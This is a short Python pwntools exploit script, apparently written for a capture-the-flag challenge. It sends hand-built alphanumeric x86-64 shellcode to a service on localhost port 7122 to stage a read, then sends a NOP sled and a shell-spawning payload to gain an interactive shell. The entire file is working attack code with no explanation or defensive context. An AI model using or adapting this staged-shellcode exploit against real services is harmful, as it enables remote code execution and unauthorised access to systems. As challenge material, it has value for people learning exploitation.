#!/usr/bin/env python2

from pwn import *

shell = (
	'TYX' + # rcx = rsp
	'h6262Z' + # rdx = 0x3632..
	'6H1QH' + # [rcx+70] = 0x15
	'W6H39X' + # rdi = 0
	'V6H31X' + # rsi = 0
	'T6H39X' + # rsi = rsp
	'haaaaZ' + # rdx = 0x61616161
	'WX' # rax = 0
	).ljust(48, 'Y')+'97'*2

context.arch='amd64'

p = remote('127.0.0.1', 7122)
#p = process('./a.out')

#p.interactive()

p.send(shell)
p.interactive()
p.sendline('\x90'*100+asm(shellcraft.sh()))

p.interactive()
